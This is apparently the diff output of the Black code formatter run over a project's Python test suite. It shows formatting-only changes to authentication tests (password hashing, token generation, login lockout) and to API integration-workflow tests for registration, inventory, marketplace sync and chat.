         assert len(user.hashed_password) > 50  # Bcrypt hashes are long
         assert user.verify_password(password) is True
         assert user.verify_password("wrongpassword") is False
-    
+
     def test_password_verification(self):
         """Test password verification functionality"""
         user = AuthUser(
             email="test@flipsync.com",
             username="testuser",
-            password="CorrectPassword123!"
-        )
-        
+            password="CorrectPassword123!",
+        )
+
         assert user.verify_password("CorrectPassword123!") is True
         assert user.verify_password("WrongPassword") is False
         assert user.verify_password("") is False
         assert user.verify_password("correctpassword123!") is False  # Case sensitive
-    
+
     def test_password_change(self):
         """Test password change functionality"""
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="OldPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="OldPassword123!"
+        )
+
         old_hash = user.hashed_password
         user.set_password("NewPassword456!")
-        
+
         # Hash should change
         assert user.hashed_password != old_hash
         assert user.verify_password("NewPassword456!") is True
         assert user.verify_password("OldPassword123!") is False
-    
+
     def test_email_verification_token_generation(self):
         """Test email verification token generation"""
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+
         token = user.generate_verification_token()
-        
+
         assert token is not None
         assert len(token) > 20  # URL-safe tokens are reasonably long
         assert user.email_verification_token == token
         assert user.email_verification_expires is not None
         assert user.is_verification_token_valid(token) is True
         assert user.is_verification_token_valid("invalid_token") is False
-    
+
     def test_password_reset_token_generation(self):
         """Test password reset token generation"""
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+
         token = user.generate_password_reset_token()
-        
+
         assert token is not None
         assert len(token) > 20
         assert user.password_reset_token == token
         assert user.password_reset_expires is not None
         assert user.is_password_reset_token_valid(token) is True
         assert user.is_password_reset_token_valid("invalid_token") is False
-    
+
     def test_email_verification_process(self):
         """Test complete email verification process"""
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+
         # Initially not verified
         assert user.is_verified is False
-        
+
         # Generate verification token
         token = user.generate_verification_token()
         assert user.is_verification_token_valid(token) is True
-        
+
         # Verify email
         user.verify_email()
         assert user.is_verified is True
         assert user.email_verification_token is None
         assert user.email_verification_expires is None
-    
+
     def test_login_tracking(self):
         """Test login success and failure tracking"""
         user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+
         # Initial state
         assert user.failed_login_attempts == 0
         assert user.last_login is None
         assert user.is_locked() is False
-        
+
         # Failed login attempts
         user.update_login_failure()
         assert user.failed_login_attempts == 1
         assert user.is_locked() is False
-        
+
         # Multiple failures
         for _ in range(4):
             user.update_login_failure()
-        
+
         assert user.failed_login_attempts == 5
         assert user.is_locked() is True
-        
+
         # Successful login resets counter
         user.update_login_success()
         assert user.failed_login_attempts == 0
         assert user.last_login is not None
         assert user.is_locked() is False
 
 
 class TestRole:
     """Test Role model functionality"""
-    
+
     def test_role_creation(self):
         """Test role creation"""
         role = Role()
         role.name = "admin"
         role.description = "System administrator"
-        
+
         assert role.name == "admin"
         assert role.description == "System administrator"
         assert role.id is not None  # UUID should be generated
 
 
 class TestPermission:
     """Test Permission model functionality"""
-    
+
     def test_permission_creation(self):
         """Test permission creation"""
         permission = Permission()
         permission.name = "users.read"
         permission.description = "Read user information"
         permission.resource = "users"
         permission.action = "read"
-        
+
         assert permission.name == "users.read"
         assert permission.resource == "users"
         assert permission.action == "read"
 
 
@@ -191,157 +181,161 @@
 class TestDatabaseInitializer:
     """
     AGENT_CONTEXT: Test database initialization functionality
     AGENT_CAPABILITY: Table creation, default data seeding
     """
-    
-    @patch('fs_agt_clean.database.init_auth_db.create_async_engine')
-    @patch('fs_agt_clean.database.init_auth_db.sessionmaker')
+
+    @patch("fs_agt_clean.database.init_auth_db.create_async_engine")
+    @patch("fs_agt_clean.database.init_auth_db.sessionmaker")
     async def test_database_initializer_creation(self, mock_sessionmaker, mock_engine):
         """Test DatabaseInitializer creation"""
         mock_engine.return_value = AsyncMock()
         mock_sessionmaker.return_value = AsyncMock()
-        
-        initializer = DatabaseInitializer("postgresql+asyncpg://test:test@localhost/test")
-        
-        assert initializer.database_url == "postgresql+asyncpg://test:test@localhost/test"
+
+        initializer = DatabaseInitializer(
+            "postgresql+asyncpg://test:test@localhost/test"
+        )
+
+        assert (
+            initializer.database_url == "postgresql+asyncpg://test:test@localhost/test"
+        )
         mock_engine.assert_called_once()
         mock_sessionmaker.assert_called_once()
-    
-    @patch('fs_agt_clean.database.init_auth_db.create_async_engine')
+
+    @patch("fs_agt_clean.database.init_auth_db.create_async_engine")
     async def test_create_tables(self, mock_engine):
         """Test table creation"""
         mock_engine_instance = AsyncMock()
         mock_engine.return_value = mock_engine_instance
         mock_conn = AsyncMock()
         mock_engine_instance.begin.return_value.__aenter__.return_value = mock_conn
-        
+
         initializer = DatabaseInitializer()
         await initializer.create_tables()
-        
+
         mock_conn.run_sync.assert_called_once()
 
 
 @pytest.mark.asyncio
 class TestAuthRepository:
     """
     AGENT_CONTEXT: Test authentication repository functionality
     AGENT_CAPABILITY: User CRUD operations, authentication logic
     """
-    
-    @patch('fs_agt_clean.core.db.auth_repository.AsyncSession')
+
+    @patch("fs_agt_clean.core.db.auth_repository.AsyncSession")
     async def test_create_user(self, mock_session):
         """Test user creation through repository"""
         mock_session_instance = AsyncMock()
         mock_session.return_value.__aenter__.return_value = mock_session_instance
-        
+
         repo = AuthRepository(mock_session)
-        
+
         user_data = {
             "email": "test@flipsync.com",
             "username": "testuser",
             "password": "TestPassword123!",
             "first_name": "Test",
-            "last_name": "User"
+            "last_name": "User",
         }
-        
+
         result = await repo.create_user(user_data)
-        
+
         mock_session_instance.add.assert_called_once()
         mock_session_instance.commit.assert_called_once()
         assert result is not None
-    
-    @patch('fs_agt_clean.core.db.auth_repository.AsyncSession')
+
+    @patch("fs_agt_clean.core.db.auth_repository.AsyncSession")
     async def test_get_user_by_email(self, mock_session):
         """Test getting user by email"""
         mock_session_instance = AsyncMock()
         mock_session.return_value.__aenter__.return_value = mock_session_instance
-        
+
         # Mock user
         mock_user = AuthUser(
-            email="test@flipsync.com",
-            username="testuser",
-            password="TestPassword123!"
-        )
-        mock_session_instance.execute.return_value.scalar_one_or_none.return_value = mock_user
-        
+            email="test@flipsync.com", username="testuser", password="TestPassword123!"
+        )
+        mock_session_instance.execute.return_value.scalar_one_or_none.return_value = (
+            mock_user
+        )
+
         repo = AuthRepository(mock_session)
         result = await repo.get_user_by_email("test@flipsync.com")
-        
+
         assert result == mock_user
         mock_session_instance.execute.assert_called_once()
 
 
 class TestAuthenticationIntegration:
     """
     AGENT_CONTEXT: Integration tests for complete authentication flow
     AGENT_CAPABILITY: End-to-end authentication testing
     """
-    
+
     def test_complete_user_registration_flow(self):
         """Test complete user registration process"""
         # Create user
         user = AuthUser(
             email="newuser@flipsync.com",
             username="newuser",
             password="SecurePassword123!",
             first_name="New",
-            last_name="User"
-        )
-        
+            last_name="User",
+        )
+
         # User should be created but not verified
         assert user.is_verified is False
         assert user.is_active is True
-        
+
         # Generate verification token
         token = user.generate_verification_token()
         assert token is not None
-        
+
         # Verify email
         user.verify_email()
         assert user.is_verified is True
-        
+
         # User should now be fully active
         assert user.is_active is True
         assert user.is_verified is True
-    
+
     def test_complete_login_flow(self):
         """Test complete login process"""
         user = AuthUser(
             email="loginuser@flipsync.com",
             username="loginuser",
-            password="LoginPassword123!"
+            password="LoginPassword123!",
         )
         user.verify_email()  # Simulate verified user
-        
+
         # Successful login
         assert user.verify_password("LoginPassword123!") is True
         user.update_login_success()
-        
+
         assert user.last_login is not None
         assert user.failed_login_attempts == 0
-        
+
         # Failed login attempts
         assert user.verify_password("WrongPassword") is False
         user.update_login_failure()
         assert user.failed_login_attempts == 1
-    
+
     def test_password_reset_flow(self):
         """Test complete password reset process"""
         user = AuthUser(
             email="resetuser@flipsync.com",
             username="resetuser",
-            password="OldPassword123!"
-        )
-        
+            password="OldPassword123!",
+        )
+
         # Generate reset token
         reset_token = user.generate_password_reset_token()
         assert user.is_password_reset_token_valid(reset_token) is True
-        
+
         # Reset password
         user.set_password("NewPassword456!")
-        
+
         # Old password should not work
         assert user.verify_password("OldPassword123!") is False
         # New password should work
         assert user.verify_password("NewPassword456!") is True
 
@@ -353,11 +347,11 @@
     return AuthUser(
         email="sample@flipsync.com",
         username="sampleuser",
         password="SamplePassword123!",
         first_name="Sample",
-        last_name="User"
+        last_name="User",
     )
 
 
 @pytest.fixture
 def admin_role():
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/test_auth_system.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/test_integration_workflows.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/test_integration_workflows.py	2025-06-19 04:04:13.409143+00:00
@@ -21,325 +21,345 @@
 class TestUserRegistrationAndAuthenticationWorkflow:
     """
     AGENT_CONTEXT: Test complete user registration and authentication workflow
     AGENT_CAPABILITY: Registration  Email verification  Login  Token usage
     """
-    
+
     @pytest.fixture
     def client(self):
         """Create test client"""
         app = create_app()
         return TestClient(app)
-    
+
     def test_complete_user_registration_workflow(self, client):
         """Test complete user registration and verification workflow"""
         # Step 1: User registration
         registration_data = {
             "email": "integration@flipsync.com",
             "username": "integrationuser",
             "password": "IntegrationTest123!",
             "first_name": "Integration",
-            "last_name": "User"
-        }
-        
-        with patch('fs_agt_clean.api.routes.auth.get_db_auth_service') as mock_auth:
-            with patch('fs_agt_clean.core.db.auth_repository.AuthRepository') as mock_repo_class:
+            "last_name": "User",
+        }
+
+        with patch("fs_agt_clean.api.routes.auth.get_db_auth_service") as mock_auth:
+            with patch(
+                "fs_agt_clean.core.db.auth_repository.AuthRepository"
+            ) as mock_repo_class:
                 mock_repo = AsyncMock()
                 mock_repo_class.return_value = mock_repo
-                
+
                 mock_user = MagicMock()
                 mock_user.id = "user_integration_123"
                 mock_user.email = "integration@flipsync.com"
                 mock_user.username = "integrationuser"
                 mock_repo.create_user.return_value = mock_user
-                
+
                 response = client.post("/api/v1/auth/register", json=registration_data)
-        
+
         assert response.status_code == status.HTTP_200_OK
         registration_result = response.json()
         assert registration_result["email"] == "integration@flipsync.com"
         assert registration_result["verification_required"] is True
-        
+
         # Step 2: Email verification (simulated)
         # In real scenario, user would click email link
-        
+
         # Step 3: User login after verification
         login_data = {
             "email": "integration@flipsync.com",
-            "password": "IntegrationTest123!"
-        }
-        
-        with patch('fs_agt_clean.api.routes.auth.get_auth_service') as mock_auth_service:
-            with patch('fs_agt_clean.api.routes.auth.get_db_auth_service') as mock_db_auth:
+            "password": "IntegrationTest123!",
+        }
+
+        with patch(
+            "fs_agt_clean.api.routes.auth.get_auth_service"
+        ) as mock_auth_service:
+            with patch(
+                "fs_agt_clean.api.routes.auth.get_db_auth_service"
+            ) as mock_db_auth:
                 mock_auth_service.return_value.authenticate_user.return_value = {
                     "username": "integrationuser",
                     "permissions": ["user"],
-                    "disabled": False
+                    "disabled": False,
                 }
                 mock_auth_service.return_value.create_tokens.return_value = {
                     "access_token": "integration_access_token",
-                    "refresh_token": "integration_refresh_token"
+                    "refresh_token": "integration_refresh_token",
                 }
-                
+
                 response = client.post("/api/v1/auth/login", json=login_data)
-        
+
         assert response.status_code == status.HTTP_200_OK
         login_result = response.json()
         assert "access_token" in login_result
         assert login_result["user"]["email"] == "integration@flipsync.com"
-        
+
         # Step 4: Use token to access protected endpoint
         access_token = login_result["access_token"]
         headers = {"Authorization": f"Bearer {access_token}"}
-        
-        with patch('fs_agt_clean.api.routes.agents.get_current_user') as mock_user:
+
+        with patch("fs_agt_clean.api.routes.agents.get_current_user") as mock_user:
             mock_user.return_value = MagicMock(id="user_integration_123")
             response = client.get("/api/v1/agents/list", headers=headers)
-        
+
         # Should be able to access protected endpoint
-        assert response.status_code in [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED]
+        assert response.status_code in [
+            status.HTTP_200_OK,
+            status.HTTP_401_UNAUTHORIZED,
+        ]
         # Note: Actual authentication might not be fully implemented
 
 
 class TestAgentCoordinationWorkflow:
     """
     AGENT_CONTEXT: Test agent coordination and communication workflow
     AGENT_CAPABILITY: Agent status  Task assignment  Coordination  Results
     """
-    
+
     @pytest.fixture
     def client(self):
         """Create test client"""
         app = create_app()
         return TestClient(app)
-    
+
     def test_agent_coordination_workflow(self, client):
         """Test complete agent coordination workflow"""
         # Step 1: Get list of available agents
         response = client.get("/api/v1/agents/list")
         assert response.status_code == status.HTTP_200_OK
         agents = response.json()
         assert len(agents) > 0
-        
+
         market_agent = None
         executive_agent = None
         for agent in agents:
             if agent["type"] == "market":
                 market_agent = agent
             elif agent["type"] == "executive":
                 executive_agent = agent
-        
+
         assert market_agent is not None
         assert executive_agent is not None
-        
+
         # Step 2: Check agent status
         response = client.get(f"/api/v1/agents/{market_agent['id']}/status")
         assert response.status_code == status.HTTP_200_OK
         status_data = response.json()
         assert status_data["agent_id"] == market_agent["id"]
-        
+
         # Step 3: Update agent configuration
         config_data = {
             "config": {
                 "analysis_depth": "detailed",
                 "update_frequency": 300,
-                "competitor_tracking": True
-            }
-        }
-        
+                "competitor_tracking": True,
+            }
+        }
+
         response = client.put(
-            f"/api/v1/agents/{market_agent['id']}/config",
-            json=config_data
+            f"/api/v1/agents/{market_agent['id']}/config", json=config_data
         )
         assert response.status_code == status.HTTP_200_OK
-        
+
         # Step 4: Simulate agent coordination
         # Market agent analyzes  Executive agent makes decisions
         # This would involve real agent communication in production
 
 
 class TestInventoryManagementWorkflow:
     """
     AGENT_CONTEXT: Test complete inventory management workflow
     AGENT_CAPABILITY: Add product  Update inventory  Sync marketplaces  Monitor
     """
-    
+
     @pytest.fixture
     def client(self):
         """Create test client"""
         app = create_app()
         return TestClient(app)
-    
+
     @pytest.fixture
     def mock_user(self):
         """Mock authenticated user"""
         from fs_agt_clean.core.models.user import User, UserRole, UserStatus
+
         return User(
             id="user_inventory_test",
             email="inventory@flipsync.com",
             username="inventoryuser",
             role=UserRole.USER,
             status=UserStatus.ACTIVE,
             created_at=datetime.now(timezone.utc),
-            updated_at=datetime.now(timezone.utc)
+            updated_at=datetime.now(timezone.utc),
         )
-    
+
     def test_inventory_management_workflow(self, client, mock_user):
         """Test complete inventory management workflow"""
         # Step 1: Add new inventory item
         inventory_data = {
             "name": "Test Product for Integration",
             "sku": "INTEGRATION-001",
             "quantity": 100,
             "price": 29.99,
             "category": "Electronics",
-            "description": "Test product for integration testing"
-        }
-        
-        with patch('fs_agt_clean.api.routes.inventory.get_current_user', return_value=mock_user):
-            with patch('fs_agt_clean.api.routes.inventory.get_inventory_service') as mock_service:
+            "description": "Test product for integration testing",
+        }
+
+        with patch(
+            "fs_agt_clean.api.routes.inventory.get_current_user", return_value=mock_user
+        ):
+            with patch(
+                "fs_agt_clean.api.routes.inventory.get_inventory_service"
+            ) as mock_service:
                 mock_service.return_value.create_item.return_value = {
                     "id": "item_integration_001",
-                    **inventory_data
+                    **inventory_data,
                 }
-                
+
                 response = client.post("/api/v1/inventory/items", json=inventory_data)
-        
+
         assert response.status_code == status.HTTP_200_OK
         created_item = response.json()
         assert created_item["name"] == "Test Product for Integration"
         item_id = created_item["id"]
-        
+
         # Step 2: Get inventory items list
-        with patch('fs_agt_clean.api.routes.inventory.get_current_user', return_value=mock_user):
-            with patch('fs_agt_clean.api.routes.inventory.get_inventory_service') as mock_service:
+        with patch(
+            "fs_agt_clean.api.routes.inventory.get_current_user", return_value=mock_user
+        ):
+            with patch(
+                "fs_agt_clean.api.routes.inventory.get_inventory_service"
+            ) as mock_service:
                 mock_service.return_value.get_items.return_value = [created_item]
-                
+
                 response = client.get("/api/v1/inventory/items?limit=10&offset=0")
-        
+
         assert response.status_code == status.HTTP_200_OK
         items_list = response.json()
         assert len(items_list["items"]) > 0
-        
+
         # Step 3: Update inventory quantity
         adjustment_data = {
             "quantity_change": -5,
             "adjustment_type": "sale",
-            "notes": "Integration test sale"
-        }
-        
-        with patch('fs_agt_clean.api.routes.inventory.get_current_user', return_value=mock_user):
-            with patch('fs_agt_clean.api.routes.inventory.get_inventory_service') as mock_service:
+            "notes": "Integration test sale",
+        }
+
+        with patch(
+            "fs_agt_clean.api.routes.inventory.get_current_user", return_value=mock_user
+        ):
+            with patch(
+                "fs_agt_clean.api.routes.inventory.get_inventory_service"
+            ) as mock_service:
                 mock_service.return_value.adjust_inventory.return_value = {
                     "success": True,
                     "new_quantity": 95,
-                    "adjustment_id": "adj_001"
+                    "adjustment_id": "adj_001",
                 }
-                
+
                 response = client.post(
-                    f"/api/v1/inventory/items/{item_id}/adjust",
-                    json=adjustment_data
+                    f"/api/v1/inventory/items/{item_id}/adjust", json=adjustment_data
                 )
-        
+
         assert response.status_code == status.HTTP_200_OK
         adjustment_result = response.json()
         assert adjustment_result["success"] is True
-        
+
         # Step 4: Sync with marketplaces
         sync_data = {
             "product_id": item_id,
             "marketplaces": ["ebay", "amazon"],
-            "sync_type": "inventory_update"
-        }
-        
-        with patch('fs_agt_clean.api.routes.marketplace.sync_product') as mock_sync:
+            "sync_type": "inventory_update",
+        }
+
+        with patch("fs_agt_clean.api.routes.marketplace.sync_product") as mock_sync:
             mock_sync.return_value = {
                 "sync_id": "sync_integration_001",
                 "status": "initiated",
-                "marketplaces": ["ebay", "amazon"]
-            }
-            
+                "marketplaces": ["ebay", "amazon"],
+            }
+
             response = client.post("/api/v1/marketplace/sync", json=sync_data)
-        
+
         assert response.status_code == status.HTTP_200_OK
         sync_result = response.json()
         assert sync_result["status"] == "initiated"
 
 
 class TestChatAndAgentInteractionWorkflow:
     """
     AGENT_CONTEXT: Test chat and agent interaction workflow
     AGENT_CAPABILITY: Create conversation  Send messages  Agent responses  Resolution
     """
-    
+
     @pytest.fixture
     def client(self):
         """Create test client"""
         app = create_app()
         return TestClient(app)
-    
+
     def test_chat_workflow(self, client):
         """Test complete chat and agent interaction workflow"""
         # Step 1: Create conversation with market agent
         conversation_data = {
             "title": "Pricing Analysis Request",
             "participants": ["user_123", "agent_market_001"],
-            "type": "agent_consultation"
-        }
-        
-        with patch('fs_agt_clean.api.routes.chat.create_conversation') as mock_create:
+            "type": "agent_consultation",
+        }
+
+        with patch("fs_agt_clean.api.routes.chat.create_conversation") as mock_create:
             mock_create.return_value = {
                 "id": "conv_integration_001",
                 "title": "Pricing Analysis Request",
-                "created_at": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "created_at": datetime.now(timezone.utc).isoformat(),
+            }
+
             response = client.post("/api/v1/chat/conversations", json=conversation_data)
-        
+
         assert response.status_code == status.HTTP_200_OK
         conversation = response.json()
         conversation_id = conversation["id"]
-        
+
         # Step 2: Send message to agent
         message_data = {
             "conversation_id": conversation_id,
             "content": "Please analyze pricing for product SKU: INTEGRATION-001",
-            "message_type": "text"
-        }
-        
-        with patch('fs_agt_clean.api.routes.chat.send_message') as mock_send:
+            "message_type": "text",
+        }
+
+        with patch("fs_agt_clean.api.routes.chat.send_message") as mock_send:
             mock_send.return_value = {
                 "id": "msg_integration_001",
                 "content": "Please analyze pricing for product SKU: INTEGRATION-001",
                 "timestamp": datetime.now(timezone.utc).isoformat(),
-                "sender": "user_123"
-            }
-            
+                "sender": "user_123",
+            }
+
             response = client.post("/api/v1/chat/messages", json=message_data)
-        
+
         assert response.status_code == status.HTTP_200_OK
         message = response.json()
         assert "Please analyze pricing" in message["content"]
-        
+
         # Step 3: Simulate agent response
         agent_response_data = {
             "conversation_id": conversation_id,
             "content": "Analysis complete. Recommended price: $27.99 based on competitor data.",
             "message_type": "agent_response",
-            "agent_id": "agent_market_001"
-        }
-        
-        with patch('fs_agt_clean.api.routes.chat.send_message') as mock_send:
+            "agent_id": "agent_market_001",
+        }
+
+        with patch("fs_agt_clean.api.routes.chat.send_message") as mock_send:
             mock_send.return_value = {
                 "id": "msg_integration_002",
                 "content": "Analysis complete. Recommended price: $27.99 based on competitor data.",
                 "timestamp": datetime.now(timezone.utc).isoformat(),
-                "sender": "agent_market_001"
-            }
-            
+                "sender": "agent_market_001",
+            }
+
             response = client.post("/api/v1/chat/messages", json=agent_response_data)
-        
+
         assert response.status_code == status.HTTP_200_OK
         agent_message = response.json()
         assert "Recommended price" in agent_message["content"]
 
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/test_integration_workflows.py

Oh no!   
435 files would be reformatted, 364 files would be left unchanged.
